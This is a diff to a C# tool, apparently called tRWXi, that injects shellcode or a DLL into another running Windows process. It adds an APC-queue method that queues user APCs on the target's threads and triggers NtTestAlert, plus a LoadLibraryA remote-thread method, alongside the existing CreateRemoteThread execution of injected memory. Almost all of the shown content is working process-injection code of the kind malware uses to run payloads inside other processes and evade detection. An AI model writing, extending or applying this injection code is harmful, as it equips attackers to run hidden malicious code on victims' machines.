@@ -1,90 +1,16 @@
 ﻿using System;
-using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
-using System.Security;
 using System.Collections.Generic;
 using tRWXi.Data;
+using static tRWXi.Data.Unmanaged;
 using System.Linq;
+using tRWXi.Utils;
+using System.Text;
 
 namespace tRWXi
 {
     public class Program
     {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESSENTRY32
-        {
-            public uint dwSize;
-            public uint cntUsage;
-            public uint th32ProcessID;
-            public IntPtr th32DefaultHeapID;
-            public uint th32ModuleID;
-            public uint cntThreads;
-            public uint th32ParentProcessID;
-            public int pcPriClassBase;
-            public uint dwFlags;
-            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szExeFile;
-        };
-
-        [DllImport("kernel32.dll")]
-        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
-
-        [DllImport("kernel32.dll")]
-        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct MEMORY_BASIC_INFORMATION
-        {
-            public IntPtr BaseAddress;
-            public IntPtr AllocationBase;
-            public uint AllocationProtect;
-            public IntPtr RegionSize;
-            public uint State;
-            public uint Protect;
-            public uint Type;
-        }
-
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll")]
-        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
-        [SuppressUnmanagedCodeSecurity]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        private const Int32 TH32CS_SNAPPROCESS = 0x02;
-        private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
-        private const Int32 MEM_COMMIT = 0x1000;
-        private const Int32 MEM_PRIVATE = 0x20000;
-        private const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;
-
         public static void Main(string[] args)
         {
             try
@@ -163,6 +89,10 @@ namespace tRWXi
                             {
                                 data = Utils.Shellcoder.convert(System.IO.File.ReadAllText(parameters["file"]));
                             }
+                            else if (parameters.ContainsKey("dll"))
+                            {
+                                data = Encoding.Default.GetBytes(parameters["dll"]); 
+                            }
                             else
                             {
                                 data = new byte[] { };
@@ -177,12 +107,41 @@ namespace tRWXi
                         {
                             IntPtr res = IntPtr.Zero;
                             Console.WriteLine("[!] Starting execution...");
-                            res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                            if (parameters.ContainsKey("method"))
+                            {
+                                if (parameters["method"].Equals(Methods.APCTestAlert.ToString()))
+                                {
+                                    IntPtr testAlertAddr = GetProcAddress(GetModuleHandle("ntdll"), "NtTestAlert");
+                                    Console.WriteLine("[*] Method {0} applied", Methods.APCTestAlert.ToString());
+                                    List<IntPtr> hThreads = Helper.getThreads(pid);
+                                    foreach(IntPtr thread in hThreads)
+                                    {
+                                        res = QueueUserAPC(addr, thread, IntPtr.Zero);
+                                        if (res != IntPtr.Zero)
+                                        {
+                                            Console.WriteLine("[+] QueueUserAPC succeeded");
+                                            break;
+                                        }
+                                    }
+                                    var testAlert = Marshal.GetDelegateForFunctionPointer<testAlert>(testAlertAddr);
+                                    testAlert();
+                                }
+                                else if (parameters["method"].Equals(Methods.DLL.ToString()))
+                                {
+                                    Console.WriteLine("[*] Method {0} applied", Methods.DLL.ToString());
+                                    IntPtr llw = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
+                                    res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, llw, addr, 0, IntPtr.Zero);
+                                }
+                            }
+                            else
+                            {
+                                res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                            }
+
                             if (res != IntPtr.Zero)
                             {
                                 Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
                             }
-                            Environment.Exit(0);
                         }
                     }
                     else
